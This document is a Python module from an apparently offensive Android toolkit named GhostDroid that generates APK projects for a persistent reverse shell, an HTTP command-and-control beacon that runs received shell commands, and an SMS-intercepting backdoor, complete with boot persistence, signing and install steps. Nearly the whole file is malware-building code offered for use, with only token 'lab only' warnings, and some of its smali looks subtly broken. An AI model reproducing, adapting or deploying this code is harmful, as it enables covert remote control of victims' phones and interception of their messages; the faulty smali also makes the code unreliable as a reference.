import time
import os
import stat
from typing import Dict, Any, List
from core.module_loader import BaseModule, ModuleMetadata
from core.ui import print_status, console, print_table, print_panel, hacker_input, show_progress

APKTOOL_INSTALL = "sudo apt install -y apktool && sudo apt install -y zipalign 2>/dev/null || sudo apt install -y android-sdk 2>/dev/null; echo 'apktool installed'"

BUILD_SCRIPT = """#!/bin/bash
# GhostDroid APK Builder — Lab Use Only
PAYLOAD="{PAYLOAD_NAME}"
LHOST={LHOST}
LPORT={LPORT}

if ! command -v apktool &>/dev/null; then
    echo "[!] apktool not found. Install with:"
    echo "    sudo apt install -y apktool"
    exit 1
fi

echo "[*] Building $PAYLOAD APK (LHOST=$LHOST LPORT=$LPORT)"

cd "$(dirname "$0")"
PROJECT="payload_$PAYLOAD"

if [ ! -d "$PROJECT" ]; then
    echo "[!] Project directory $PROJECT not found"
    exit 1
fi

cd "$PROJECT"

echo "[*] Compiling with apktool..."
apktool b . -o "$PAYLOAD.apk" 2>&1
if [ $? -ne 0 ]; then
    echo "[x] Build failed"
    exit 1
fi

echo "[*] Signing with debug key..."
KEYSTORE="$HOME/.android/debug.keystore"
if [ ! -f "$KEYSTORE" ]; then
    keytool -genkey -v -keystore "$KEYSTORE" \\
        -alias androiddebugkey -keyalg RSA -keysize 2048 \\
        -validity 10000 -storepass android -keypass android \\
        -dname "CN=GhostDroid, OU=Lab, O=GhostDroid, L=Unknown, ST=Unknown, C=US" 2>/dev/null
fi
jarsigner -sigalg SHA1withRSA -digestalg SHA1 \\
    -keystore "$KEYSTORE" -storepass android "$PAYLOAD.apk" androiddebugkey 2>&1

if [ $? -eq 0 ]; then
    echo ""
    echo "[+] APK ready: $(pwd)/$PAYLOAD.apk"
    echo ""
    echo "    Install: adb install -r -g $PAYLOAD.apk"
    echo "    Listener: nc -lvnp $LPORT"
    echo "    After install: open app once, then reboot"
else
    echo "[x] Signing failed"
    exit 1
fi
"""

MAIN_ACTIVITY_SMALI = """.class public Lcom/ghostdroid/pay/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .registers 4
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    new-instance v0, Landroid/content/Intent;
    const-string v1, "com.ghostdroid.pay.PayloadService"
    invoke-direct {v0, p1}, Landroid/content/Intent;-><init>(Landroid/content/Intent;)V
    invoke-virtual {p0, v0}, Lcom/ghostdroid/pay/MainActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    const v0, 0x7f040001
    invoke-virtual {p0, v0}, Lcom/ghostdroid/pay/MainActivity;->setContentView(I)V
    return-void
.end method
"""

BOOT_RECEIVER_SMALI = """.class public Lcom/ghostdroid/pay/BootReceiver;
.super Landroid/content/BroadcastReceiver;
.source "BootReceiver.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 5
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/ghostdroid/pay/PayloadService;
    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method
"""

SMS_RECEIVER_SMALI = """.class public Lcom/ghostdroid/pay/SmsReceiver;
.super Landroid/content/BroadcastReceiver;
.source "SmsReceiver.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .registers 11
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;
    move-result-object v0

    if-nez v0, :cond_7
    return-void

    :cond_7
    const-string v1, "pdus"
    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;
    move-result-object v1
    check-cast v1, [Ljava/lang/Object;

    array-length v2, v1
    const/4 v3, 0x0
    :goto_10
    if-ge v3, v2, :cond_2f
    aget-object v4, v1, v3
    check-cast v4, [B
    invoke-static {v4}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;
    move-result-object v4

    invoke-virtual {v4}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;
    move-result-object v4

    if-eqz v4, :cond_2c
    const-string v5, "GD#"
    invoke-virtual {v4, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
    move-result v5

    if-eqz v5, :cond_2c
    invoke-virtual {p0}, Lcom/ghostdroid/pay/SmsReceiver;->abortBroadcast()V
    new-instance v5, Ljava/lang/StringBuilder;
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v4
    const-string v5, "GDSMS"
    invoke-static {v5, v4}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    :cond_2c
    add-int/lit8 v3, v3, 0x1
    goto :goto_10

    :cond_2f
    return-void
.end method
"""

REVERSE_SHELL_SERVICE = """.class public Lcom/ghostdroid/pay/PayloadService;
.super Landroid/app/Service;
.source "PayloadService.java"

.field private static final C2_HOST:Ljava/lang/String; = "{LHOST}"
.field private static final C2_PORT:I = {LPORT}
.field private static final RECONNECT_DELAY:J = 15000L

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    new-instance v0, Ljava/lang/Thread;
    invoke-direct {v0, p0}, Ljava/lang/Thread;-><init>(Ljava/lang/Object;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    const/4 v0, 0x1
    return v0
.end method

.method public run()V
    .registers 10
    :try_start
    new-instance v0, Ljava/net/Socket;
    sget-object v1, Lcom/ghostdroid/pay/PayloadService;->C2_HOST:Ljava/lang/String;
    sget v2, Lcom/ghostdroid/pay/PayloadService;->C2_PORT:I
    invoke-direct {v0, v1, v2}, Ljava/net/Socket;-><init>(Ljava/lang/String;I)V
    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v1
    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v2
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v3
    const-string v4, "sh"
    invoke-virtual {v3, v4}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v3
    invoke-virtual {v3}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-virtual {v3}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5

    new-instance v6, Ljava/lang/Thread;
    new-instance v7, Lcom/ghostdroid/pay/PayloadService$1;
    invoke-direct {v7, p0, v4, v2}, Lcom/ghostdroid/pay/PayloadService$1;-><init>(Lcom/ghostdroid/pay/PayloadService;Ljava/io/InputStream;Ljava/io/OutputStream;)V
    invoke-direct {v6, v7}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    invoke-virtual {v6}, Ljava/lang/Thread;->start()V

    const/16 v6, 0x1000
    new-array v6, v6, [B
    :goto_30
    invoke-virtual {v1, v6}, Ljava/io/InputStream;->read([B)I
    move-result v7
    if-ltz v7, :cond_3b
    const/4 v8, 0x0
    invoke-virtual {v5, v6, v8, v7}, Ljava/io/OutputStream;->write([BII)V
    invoke-virtual {v5}, Ljava/io/OutputStream;->flush()V
    goto :goto_30
    :cond_3b
    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    goto :goto_42
    :try_start_3e
    :try_end_3e
    .catch Ljava/lang/Exception; {:try_start_3e .. :try_end_3e} :catch_3f

    :catch_3f
    move-exception v0

    :try_start_40
    sget-wide v0, Lcom/ghostdroid/pay/PayloadService;->RECONNECT_DELAY:J
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    goto/16 :goto_start
    :try_end_47
    .catch Ljava/lang/Exception; {:try_start_40 .. :try_end_47} :catch_48
    :catch_48
    :goto_42
    return-void
.end method
"""

INNER_CLASS_SMALI = """.class Lcom/ghostdroid/pay/PayloadService$1;
.super Ljava/lang/Object;
.implements Ljava/lang/Runnable;
.source "PayloadService.java"

.method public constructor <init>(Lcom/ghostdroid/pay/PayloadService;Ljava/io/InputStream;Ljava/io/OutputStream;)V
    .registers 4
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method public run()V
    .registers 6
    const/16 v0, 0x1000
    new-array v0, v0, [B
    :goto_4
    :try_start_4
    iget-object v1, p0, Lcom/ghostdroid/pay/PayloadService$1;->val$procOut:Ljava/io/InputStream;
    invoke-virtual {v1, v0}, Ljava/io/InputStream;->read([B)I
    move-result v1
    if-ltz v1, :cond_14
    iget-object v2, p0, Lcom/ghostdroid/pay/PayloadService$1;->val$socketOut:Ljava/io/OutputStream;
    const/4 v3, 0x0
    invoke-virtual {v2, v0, v3, v1}, Ljava/io/OutputStream;->write([BII)V
    invoke-virtual {v2}, Ljava/io/OutputStream;->flush()V
    goto :goto_4
    :cond_14
    :try_end_14
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_14} :catch_14
    :catch_14
    return-void
.end method
"""

HTTP_BEACON_SERVICE = """.class public Lcom/ghostdroid/pay/PayloadService;
.super Landroid/app/Service;
.source "PayloadService.java"

.field private static final C2_URL:Ljava/lang/String; = "http://{LHOST}:{LPORT}"
.field private static final BEACON_MS:J = 30000L

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 5
    new-instance v0, Ljava/lang/Thread;
    invoke-direct {v0, p0}, Ljava/lang/Thread;-><init>(Ljava/lang/Object;)V
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    const/4 v0, 0x1
    return v0
.end method

.method public run()V
    .registers 9
    :goto_start
    :try_start_0
    new-instance v0, Ljava/net/URL;
    new-instance v1, Ljava/lang/StringBuilder;
    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V
    sget-object v2, Lcom/ghostdroid/pay/PayloadService;->C2_URL:Ljava/lang/String;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v2, "/task?id="
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    sget-object v2, Landroid/os/Build;->SERIAL:Ljava/lang/String;
    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1
    invoke-direct {v0, v1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
    move-result-object v0
    check-cast v0, Ljava/net/HttpURLConnection;

    const/16 v1, 0x2710
    invoke-virtual {v0, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;
    move-result-object v1

    new-instance v2, Ljava/io/BufferedReader;
    new-instance v3, Ljava/io/InputStreamReader;
    invoke-direct {v3, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v2, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {v2}, Ljava/io/BufferedReader;->close()V
    invoke-virtual {v0}, Ljava/net/HttpURLConnection;->disconnect()V

    if-eqz v1, :cond_47
    invoke-virtual {v1}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z
    move-result v2
    if-nez v2, :cond_47
    invoke-static {v0}, Lcom/ghostdroid/pay/PayloadService;->execCmd(Ljava/lang/String;)Ljava/lang/String;
    :try_end_47
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_47} :catch_47

    :cond_47
    :try_start_47
    :catch_47
    sget-wide v0, Lcom/ghostdroid/pay/PayloadService;->BEACON_MS:J
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    goto/16 :goto_start
    :try_end_4e
    .catch Ljava/lang/Exception; {:try_start_47 .. :try_end_4e} :catch_4e
    :catch_4e
    return-void
.end method

.method private static execCmd(Ljava/lang/String;)Ljava/lang/String;
    .registers 6
    :try_start_0
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    const/4 v1, 0x2
    new-array v1, v1, [Ljava/lang/String;
    const/4 v2, 0x0
    const-string v3, "sh"
    aput-object v3, v1, v2
    const/4 v2, 0x1
    const-string v3, "-c"
    aput-object v3, v1, v2
    const/4 v2, 0x2
    aput-object p0, v1, v2
    invoke-virtual {v0, v1}, Ljava/lang/Runtime;->exec([Ljava/lang/String;)Ljava/lang/Process;
    move-result-object v0

    new-instance v1, Ljava/io/BufferedReader;
    new-instance v2, Ljava/io/InputStreamReader;
    invoke-virtual {v0}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v3
    invoke-direct {v2, v3}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V
    invoke-direct {v1, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    new-instance v2, Ljava/lang/StringBuilder;
    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_26} :catch_26

    :goto_26
    :try_start_26
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    move-result-object v3
    if-eqz v3, :cond_34
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v4, "\\n"
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    goto :goto_26
    :cond_34
    invoke-virtual {v0}, Ljava/lang/Process;->waitFor()I
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v0
    return-object v0
    :try_end_3b
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_3b} :catch_26
    :catch_3b
    const-string v0, ""
    return-object v0
.end method
"""

ANDROID_MANIFEST = """<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.ghostdroid.pay">

    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>

    <application android:label="GhostService" android:icon="@mipmap/ic_launcher"
        android:supportsRtl="false" android:debuggable="false">

        <activity android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service android:name=".PayloadService"
            android:exported="false"
            android:enabled="false"/>

        <receiver android:name=".BootReceiver"
            android:exported="false"
            android:enabled="false">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

        <receiver android:name=".SmsReceiver"
            android:exported="false"
            android:enabled="false">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>

    </application>
</manifest>"""

PAYLOAD_TEMPLATES = {
    "android_reverse_shell": {
        "name": "Android Reverse Shell",
        "type": "reverse_shell",
        "description": "BOOT_COMPLETED persistent reverse TCP shell",
        "risk": "critical",
        "manifest_perms": "INTERNET, RECEIVE_BOOT, FOREGROUND_SERVICE",
        "smali_service": REVERSE_SHELL_SERVICE,
        "extra_smali_files": [("PayloadService$1.smali", INNER_CLASS_SMALI)],
        "has_boot_receiver": True,
        "has_sms_receiver": False,
    },
    "android_http_beacon": {
        "name": "Android HTTP C2 Beacon",
        "type": "http_c2",
        "description": "HTTP beaconing agent — periodic C2 check-in for tasks",
        "risk": "critical",
        "manifest_perms": "INTERNET, ACCESS_NETWORK_STATE, RECEIVE_BOOT, FOREGROUND_SERVICE",
        "smali_service": HTTP_BEACON_SERVICE,
        "extra_smali_files": [],
        "has_boot_receiver": True,
        "has_sms_receiver": False,
    },
    "android_sms_backdoor": {
        "name": "Android SMS Backdoor",
        "type": "sms_backdoor",
        "description": "SMS-controlled backdoor — commands via GD# prefixed texts",
        "risk": "critical",
        "manifest_perms": "RECEIVE_SMS, READ_SMS, INTERNET, RECEIVE_BOOT",
        "smali_service": REVERSE_SHELL_SERVICE,
        "extra_smali_files": [("PayloadService$1.smali", INNER_CLASS_SMALI)],
        "has_boot_receiver": True,
        "has_sms_receiver": True,
    },
}


class PayloadGeneratorModule(BaseModule):
    metadata = ModuleMetadata(
        name="payload_generator",
        version="2.0.0",
        description="Generate compilable Android APK projects with remote access payloads",
        author="GhostDroid",
        risk_level="critical",
        requires_adb=False,
        category="payload",
    )

    def run(self, *args, **kwargs) -> Dict[str, Any]:
        console.print("[bold cyan]╔══ Payload Generator ══╗[/]")
        console.print("[dim]Generates smali source — compile with apktool[/]\n")

        action = kwargs.get("action", "list")
        payload_name = kwargs.get("payload_name")

        if action == "list":
            return self._list_payloads()
        elif action == "generate" and payload_name:
            lhost = kwargs.get("lhost") or hacker_input("[cyan]C2 server IP (LHOST)[/]")
            lport = kwargs.get("lport") or hacker_input("[cyan]C2 server port (LPORT)[/]", password=True)
            return self._generate_payload(payload_name, lhost, lport)
        else:
            return self._interactive_menu()

    def _list_payloads(self) -> Dict:
        rows = []
        for name, tmpl in PAYLOAD_TEMPLATES.items():
            rows.append([
                name,
                tmpl["type"],
                tmpl["description"][:40],
                tmpl["manifest_perms"][:30],
                f"[red]{tmpl['risk']}[/]",
            ])
        print_table(
            "Payload Templates",
            ["Name", "Type", "Description", "Permissions", "Risk"],
            rows,
            "cyan"
        )
        return {"payloads": list(PAYLOAD_TEMPLATES.keys())}

    def _generate_payload(self, name: str, lhost: str, lport: str) -> Dict:
        if name not in PAYLOAD_TEMPLATES:
            print_status(f"Payload '{name}' not found", "error")
            return {"error": "Payload not found"}

        template = PAYLOAD_TEMPLATES[name]
        console.print(f"\n[bold yellow][*] Generating payload: {name}[/]")
        show_progress("Writing project files", 1.5)

        output_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)),
                                   "payloads", "generated")
        os.makedirs(output_dir, exist_ok=True)

        project_dir = os.path.join(output_dir, f"payload_{name}")
        smali_dir = os.path.join(project_dir, "smali", "com", "ghostdroid", "pay")
        res_dir = os.path.join(project_dir, "res", "values")
        java_dir = os.path.join(project_dir, "src", "com", "ghostdroid", "pay")
        mipmap_dir = os.path.join(project_dir, "res", "mipmap-hdpi")
        os.makedirs(smali_dir, exist_ok=True)
        os.makedirs(res_dir, exist_ok=True)
        os.makedirs(java_dir, exist_ok=True)
        os.makedirs(mipmap_dir, exist_ok=True)

        service_smali = template["smali_service"] \
            .replace("{LHOST}", lhost) \
            .replace("{LPORT}", str(lport))

        with open(os.path.join(smali_dir, "PayloadService.smali"), "w") as f:
            f.write(service_smali)

        with open(os.path.join(smali_dir, "MainActivity.smali"), "w") as f:
            f.write(MAIN_ACTIVITY_SMALI)

        if template["has_boot_receiver"]:
            with open(os.path.join(smali_dir, "BootReceiver.smali"), "w") as f:
                f.write(BOOT_RECEIVER_SMALI)

        if template["has_sms_receiver"]:
            with open(os.path.join(smali_dir, "SmsReceiver.smali"), "w") as f:
                f.write(SMS_RECEIVER_SMALI)

        for filename, content in template.get("extra_smali_files", []):
            with open(os.path.join(smali_dir, filename), "w") as f:
                f.write(content)

        with open(os.path.join(project_dir, "AndroidManifest.xml"), "w") as f:
            f.write(ANDROID_MANIFEST)

        with open(os.path.join(res_dir, "strings.xml"), "w") as f:
            f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
                    '    <string name="app_name">GhostService</string>\n</resources>\n')

        with open(os.path.join(res_dir, "styles.xml"), "w") as f:
            f.write('<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
                    '    <style name="AppTheme" parent="android:Theme.Material.NoActionBar"/>\n</resources>\n')

        apktool_yml = "version: 2.0.0\napkFileName: ghostdroid.apk\n"
        with open(os.path.join(project_dir, "apktool.yml"), "w") as f:
            f.write(apktool_yml)

        java_source = f"""// GhostDroid Payload — {template['name']}
// LHOST={lhost}  LPORT={lport}
// This Java source is for educational reference.
// The actual build uses smali files in ../smali/

package com.ghostdroid.pay;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import java.io.*;
import java.net.Socket;

public class PayloadService extends Service {{
    private static final String HOST = "{lhost}";
    private static final int PORT = {lport};

    @Override
    public int onStartCommand(Intent i, int f, int id) {{
        new Thread(this::run).start();
        return START_STICKY;
    }}

    public void run() {{
        while (true) {{
            try {{
                Socket s = new Socket(HOST, PORT);
                InputStream si = s.getInputStream();
                OutputStream so = s.getOutputStream();
                Process p = Runtime.getRuntime().exec("sh");
                new Thread(() -> {{
                    try {{
                        byte[] b = new byte[4096];
                        int n;
                        while ((n = p.getInputStream().read(b)) != -1)
                            so.write(b, 0, n);
                    }} catch (Exception e) {{}}
                }}).start();
                byte[] b = new byte[4096];
                int n;
                while ((n = si.read(b)) != -1)
                    p.getOutputStream().write(b, 0, n);
                s.close();
            }} catch (Exception e) {{}}
            try {{ Thread.sleep(15000); }} catch (Exception e) {{}}
        }}
    }}

    @Override
    public IBinder onBind(Intent i) {{ return null; }}
}}
"""
        with open(os.path.join(java_dir, "PayloadService.java"), "w") as f:
            f.write(java_source)

        build_script = BUILD_SCRIPT.replace("{PAYLOAD_NAME}", name) \
            .replace("{LHOST}", lhost) \
            .replace("{LPORT}", str(lport))
        build_path = os.path.join(output_dir, "build.sh")
        with open(build_path, "w") as f:
            f.write(build_script)
        os.chmod(build_path, os.stat(build_path).st_mode | stat.S_IEXEC)

        print_status(f"Project: {project_dir}", "success")
        print_status(f"Build:   {build_path}", "success")
        print_status(f"Java:    {java_dir}/PayloadService.java", "success")
        print_status(f"Smali:   {smali_dir}/PayloadService.smali", "success")

        print_panel(
            f"[bold green]Project generated[/]\n\n"
            f"[cyan]Payload:[/]  {template['name']}\n"
            f"[cyan]Type:[/]     {template['type']}\n"
            f"[cyan]C2:[/]       {lhost}:{lport}\n\n"
            f"[yellow]Install apktool:[/]\n"
            f"  sudo apt install -y apktool\n\n"
            f"[yellow]Build APK:[/]\n"
            f"  {build_path}  (or: cd {project_dir} && apktool b .)\n\n"
            f"[yellow]Install:[/]\n"
            f"  adb install -r -g {name}.apk\n\n"
            f"[yellow]Enable auto-start (edit AndroidManifest.xml):[/]\n"
            f"  Set android:enabled=\"true\" on receivers you want active\n\n"
            f"[red]⚠ For authorized lab devices only[/]",
            title="Build APK",
            style="green",
        )

        return {
            "name": name,
            "lhost": lhost,
            "lport": lport,
            "project_dir": project_dir,
        }

    def _interactive_menu(self) -> Dict:
        self._list_payloads()
        name = hacker_input("[cyan]Enter payload name to generate[/]")
        lhost = hacker_input("[cyan]C2 server IP (LHOST)[/]")
        lport = hacker_input("[cyan]C2 server port (LPORT)[/]", password=True)
        return self._generate_payload(name, lhost, lport)
